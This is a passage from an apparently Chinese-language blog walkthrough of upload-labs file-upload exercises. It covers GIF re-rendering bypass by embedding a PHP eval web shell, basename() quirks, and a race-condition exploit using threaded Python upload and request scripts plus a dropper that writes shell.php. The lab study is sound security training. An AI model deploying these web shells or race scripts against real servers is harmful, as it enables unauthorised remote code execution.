invoke__\">time</span>());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = <span class=\"title function_ invoke__\">strval</span>(<span class=\"title function_ invoke__\">rand</span>()).<span class=\"string\">&quot;.png&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">imagepng</span>(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;               </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;gif&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = <span class=\"title function_ invoke__\">imagecreatefromgif</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                <span class=\"title function_ invoke__\">srand</span>(<span class=\"title function_ invoke__\">time</span>());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = <span class=\"title function_ invoke__\">strval</span>(<span class=\"title function_ invoke__\">rand</span>()).<span class=\"string\">&quot;.gif&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">imagegif</span>(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里首先更新一下对于某些 php 代码细节的问题：</p>\n<p>①对于 <code>name</code>  和 <code>tmp_name</code>  两个字段的理解</p>\n<p><img src=\"image-20221004110008338.png\" alt=\"image-20221004110008338\"></p>\n<p>可以看出</p>\n<ul>\n<li><code>$_FILES['upload_file'['name']</code>  获取到的是文件原始名称（<strong>不带路径，只有文件名</strong>）</li>\n<li><code>$_FILES['upload_file']['tmp_name']</code>  则是获取该文件在上传到服务器后的临时文件名（<strong>带绝对路径</strong>）</li>\n</ul>\n<p>②UPLOAD_PATH，为什么大写？这是什么东西？</p>\n<p>可以在  <code>C:\\phpStudyB\\WWW\\upload-labs-0.1\\config.php</code>  中看到如下 <code>宏定义</code> ：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;WWW_ROOT&quot;</span>,<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;APP_ROOT&quot;</span>,<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>,<span class=\"string\">&#x27;/&#x27;</span>,<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>)));</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;APP_URL_ROOT&quot;</span>,<span class=\"title function_ invoke__\">str_replace</span>(WWW_ROOT,<span class=\"string\">&quot;&quot;</span>,APP_ROOT));</span><br><span class=\"line\"><span class=\"comment\">//文件包含漏洞页面</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;INC_VUL_PATH&quot;</span>,APP_URL_ROOT . <span class=\"string\">&quot;/include.php&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//设置上传目录</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;UPLOAD_PATH&quot;</span>, <span class=\"string\">&quot;../upload&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>UPLOAD_PATH 是我们自定义的一个宏，它代表着 <code>WWW</code>  根目录下的 <code>upload/</code>  子目录</p>\n<p>③basename () 函数返回路径中的文件名部分</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">参数</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>path</strong></td>\n<td style=\"text-align:left\"><strong>必需。规定要检查的路径。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">suffix</td>\n<td style=\"text-align:left\">可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名。</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"string\">&quot;/testweb/home.php&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//Show filename with file extension</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$path</span>) .<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//Show filename without file extension</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$path</span>,<span class=\"string\">&quot;.php&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">输出结果</span><br><span class=\"line\">&gt; home.php</span><br><span class=\"line\">&gt; home</span><br></pre></td></tr></table></figure>\n<p>这里简单介绍下绕过 basename () 原理:</p>\n<p>其实就是匹配最后一个 <code>/（斜杠）</code> ，然后截取 <code>/（斜杠）</code> 右侧的字符串输出</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">basename</span>(<span class=\"string\">&quot;index.php/config.php?source&quot;</span>);</span><br><span class=\"line\">&gt;&gt; config.php?source</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">basename</span>(<span class=\"string\">&quot;index.php/config.php/?source&quot;</span>);</span><br><span class=\"line\">&gt;&gt; ?source</span><br></pre></td></tr></table></figure>\n<p>在使用默认语言环境设置时，basename () 会<strong>删除</strong>文件名开头的非 ASCII 字符。</p>\n<ul>\n<li>当斜杠右侧的字符 ascii 值为 47、129-255 时，basename 会解析回上一个目录，将其当成文件名输出\n<ul>\n<li>例如： <code>http://127.0.0.1/basename_pass/index.php/config.php/%ff?source</code> ， <code>basename()</code>  会返回 <code>config.php</code>  而不是 <code>?source</code></li>\n</ul>\n</li>\n<li>其中 47 对应的符号为’/’，在实际场景中没有利用价值</li>\n</ul>\n<p>同时可能还会伴随着 <code>$_SERVER['PHP_SELF']</code>  的使用， <code>PHP_SELF是输出当前php文件相当于根目录的路径</code>  (不带参数)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#如果当前文件是127.0.0.1/1.php/config.php/aa?source</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>])：</span><br><span class=\"line\">&gt;&gt; /<span class=\"number\">1</span>.php/config.php/aa</span><br></pre></td></tr></table></figure>\n<p>好了，言归正传，本题目判断上传文件后缀名，如果满足 jpg、png、gif 则使用 imagecreatefromjpeg () 来生成一个 image 资源</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">resource <span class=\"title function_ invoke__\">imagecreatefromjpeg</span>( <span class=\"keyword\">string</span> <span class=\"variable\">$filename</span> )</span><br></pre></td></tr></table></figure>\n<p><strong>参数</strong>：该函数接受单个参数 $filename，该参数保存图像的名称。</p>\n<p><strong>返回值</strong>：成功时此函数返回图像资源标识符，错误时返回 FALSE。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">---载入图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagecreatefromgif</span>()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagecreatefromjpeg</span>()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagecreatefrompng</span>()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagecreatefromwbmp</span>()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagecreatefromstring</span>()：创建一块画布，并从字符串中的图像流新建一副图像</span><br><span class=\"line\"></span><br><span class=\"line\">---输出图像</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagegif</span>()：以 GIF 格式将图像输出到浏览器或文件</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagejpeg</span>()：以 JPEG 格式将图像输出到浏览器或文件</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagepng</span>()：以 PNG 格式将图像输出到浏览器或文件</span><br><span class=\"line\"><span class=\"title function_ invoke__\">imagewbmp</span>()：以 WBMP 格式将图像输出到浏览器或文件</span><br></pre></td></tr></table></figure>\n<p>这个函数比较有意思，会从传入的这个 <code>filename</code>  的文件中 <code>分离出图片的信息</code> ，将 <code>抛弃非图片的信息</code> 。</p>\n<p>分离后，使用 <code>imagexxx()</code>  函数 <code>二次渲染输出</code> 到浏览器中来显示。</p>\n<p>那么，<strong>图片马将在此题中失效</strong>。</p>\n<p>我们首先来看一下上传后的图片和原图片的区别：</p>\n<p>上传前–&gt; <code>11111-before.gif</code></p>\n<p>上传后–&gt; <code>11111-after.gif</code></p>\n<p>将两个文件拖入 winhex</p>\n<p><img src=\"image-20221004125950424.png\" alt=\"image-20221004125950424\"></p>\n<p>使用 winhex——view——Synchronize &amp; Compare，发现从 0x784 地址后有基本上都不一样，但是前面地址中基本没变过。</p>\n<p><img src=\"image-20221004130104907.png\" alt=\"image-20221004130104907\"></p>\n<p>因此，绕过思路就是在白色区域（没有变化的区域）中，随便找一个地方，修改十六进制为 <code>&lt;?php @eval($_POST[ABCD]);?&gt;</code></p>\n<p><img src=\"image-20221004130447210.png\" alt=\"image-20221004130447210\"></p>\n<p>重命名为： <code>fix-phpimage.gif</code> ，上传抓包</p>\n<p><img src=\"image-20221004131006052.png\" alt=\"image-20221004131006052\"></p>\n<p>上传成功后下载下来使用 Notepad++ 打开查看，搜索 php，发现一句话木马还在。</p>\n<p><img src=\"image-20221004130716362.png\" alt=\"image-20221004130716362\"></p>\n<p>使用菜刀连接：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.upload_lab.com/include.php?file=./upload/29139.gif</span><br></pre></td></tr></table></figure>\n<p>成功连接</p>\n<p><img src=\"image-20221004130927936.png\" alt=\"image-20221004130927936\"></p>\n<h2 id=\"利用条件竞争漏洞1\"><a class=\"markdownIt-Anchor\" href=\"#利用条件竞争漏洞1\">#</a> 利用条件竞争漏洞（1）</h2>\n<p>Pass-17 为例</p>\n<p>阅读源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$file_name</span>,<span class=\"title function_ invoke__\">strrpos</span>(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. <span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             <span class=\"title function_ invoke__\">rename</span>(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>依旧是分析主逻辑：</p>\n<ul>\n<li>设置白名单， <code>jpg</code> 、 <code>png</code> 、 <code>gif</code></li>\n<li>获取文件原始名、临时文件（带路径）、文件后缀</li>\n<li><code>upload_file</code>  为 <code>上传路径</code>  + <code>/</code> + <code>文件原始名</code></li>\n<li>判断是否临时文件能成功移动到永久目录\n<ul>\n<li>过滤好白名单后缀，设置 <code>img_path</code>  为 <code>上传路径</code>  + <code>/</code> + <code>随机数</code>  + <code>时间戳</code>  + <code>.</code> + <code>后缀</code></li>\n<li>使用 <code>rename()</code>  函数将 <code>upload_file</code>  这个路径 <strong>重命名</strong> 成 <code>img_path</code>  这个路径</li>\n</ul>\n</li>\n</ul>\n<p>整个 <code>上传后</code> 的过程可以再精简为</p>\n<ol>\n<li><code>move_uploaded_file()</code>  复制</li>\n<li><code>in_array()</code>  判断后缀是否在白名单内</li>\n<li><code>rename()</code>  重命名成随机文件名</li>\n</ol>\n<p>在这三步的过程中，如果是通过多个线程来同时进行，会存在 <code>条件竞争</code> 漏洞。</p>\n<p>也就是说，总会有那么一种时刻，复制好以后 “<strong>还没来得及</strong>判断和重命名”，这时就有个请求访问到了我们的上传文件。</p>\n<p>所以即使不是 <code>jpg</code> 、 <code>png</code> 、 <code>gif</code>  也没关系了，只要请求在复制好以后过来访问，就可以访问上传后的文件。</p>\n<p>不过有几个事情需要注意：</p>\n<ul>\n<li>访问的文件如果是个 php，就可以成功解析执行。</li>\n<li>不过由于之后还会因为继续走到步骤 2 判断，这时候 php 文件不满足白名单后缀，所以依旧会被 unlink 删除。</li>\n</ul>\n<p>那么我们可以让这个上传 php 在 <code>被访问后</code> 到 <code>被删之前</code> 干如下的事情：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>妙啊～</strong></p>\n<p>被删之前创建一个 shell.php，保留下来，而里面正好就是一句话木马。</p>\n<p><code>第一个线程池</code> 做 <code>上传</code> 代码：</p>\n<p><code>注意</code></p>\n<ul>\n<li>用到了 <code>hackhttp</code>  库和 <code>Pool</code>  库</li>\n<li>本来的 backdoor.php 中只含有一句话木马，我们需要在抓包时给它替换成 <code>生成shell.php那一句代码</code></li>\n<li>在使用 <code>pool</code>  的 <code>map</code>  方法的时候，第一个参数为线程要处理函数，第二个参数为处理函数的参数…</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hackhttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload</span>(<span class=\"params\">counts</span>):</span><br><span class=\"line\">    hh = hackhttp.hackhttp()</span><br><span class=\"line\">    raw = <span class=\"string\">&quot;&quot;&quot;POST /Pass-17/index.php?action=show_code HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: www.upload_lab.com</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1</span></span><br><span class=\"line\"><span class=\"string\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class=\"line\"><span class=\"string\">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span></span><br><span class=\"line\"><span class=\"string\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\">Referer: http://www.upload_lab.com/Pass-17/index.php?action=show_code</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------31673223865021</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 345</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">-----------------------------31673223865021</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;backdoor.php&quot;</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: application/octet-stream</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?&gt;</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------31673223865021</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">submit</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------31673223865021--</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    code,head,html,redirect,log = hh.http(<span class=\"string\">&#x27;http://www.upload_lab.com/Pass-17/index.php&#x27;</span>,raw=raw)</span><br><span class=\"line\">    <span class=\"built_in\">print</span> code</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(<span class=\"number\">50</span>)</span><br><span class=\"line\">pool.<span class=\"built_in\">map</span>(upload,<span class=\"built_in\">range</span>(<span class=\"number\">10000</span>))</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br></pre></td></tr></table></figure>\n<p><code>第二个线程池</code> 做 <code>请求访问</code> 代码：</p>\n<p><code>注意</code></p>\n<ul>\n<li>请求的地址为 <code>'http://www.upload_lab.com/upload/backdoor.php</code></li>\n<li>在使用 <code>pool</code>  的 <code>map</code>  方法的时候，第一个参数为线程要处理函数，第二个参数为处理函数的参数…</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hackhttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload</span>(<span class=\"params\">counts</span>):</span><br><span class=\"line\">    hh = hackhttp.hackhttp()</span><br><span class=\"line\">\t</span><br><span class=\"line\">    code,head,html,redirect,log = hh.http(<span class=\"string\">&#x27;http://www.upload_lab.com/upload/backdoor.php&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span> code</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(<span class=\"number\">50</span>)</span><br><span class=\"line\">pool.<span class=\"built_in\">map</span>(upload,<span class=\"built_in\">range</span>(<span class=\"number\">5000</span>))</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br></pre></td></tr></table></figure>\n<p>可以看到左边上传成功，右边在请求的时候，会有几次是 200 请求成功的。</p>\n<p><img src=\"image-20221004135312736.png\" alt=\"image-20221004135312736\"></p>\n<p>再次刷新文件夹，就会有 shell.php 产生</p>\n<p><img src=\"image-20221004135517602.png\" alt=\"image-20221004135517602\"></p>\n<p>菜刀成功连接。</p>\n<h2 id=\"利用条件竞争漏洞2\"><a class=\"markdownIt-Anchor\" href=\"#利用条件竞争漏洞2\">#</a> 利用条件竞争漏洞（2）</h2>\n<p>继续看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">&quot;./myupload.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$imgFileName</span> =<span class=\"title function_ invoke__\">time</span>();</span><br><span class=\"line\">    <span class=\"variable\">$u</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">MyUpload</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>], <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>],<span class=\"variable\">$imgFileName</span>);</span><br><span class=\"line\">    <span class=\"variable\">$status_code</span> = <span class=\"variable\">$u</span>-&gt;<span class=\"title function_ invoke__\">upload</span>(UPLOAD_PATH);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$status_code</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = <span class=\"variable\">$u</span>-&gt;cls_upload_dir . <span class=\"variable\">$u</span>-&gt;cls_file_rename_to;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">3</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">5</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; </span><br><span class=\"line\">        <span class=\"keyword\">case</span> -<span class=\"number\">6</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;      </span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;未知错误！&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//myupload.php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyUpload</span></span>&#123;</span><br><span class=\"line\">......</span><br><span class=\"line\">......</span><br><span class=\"line\">...... </span><br><span class=\"line\">  <span class=\"keyword\">var</span> <span class=\"variable\">$cls_arr_ext_accepted</span> = <span class=\"keyword\">array</span>(</span><br><span 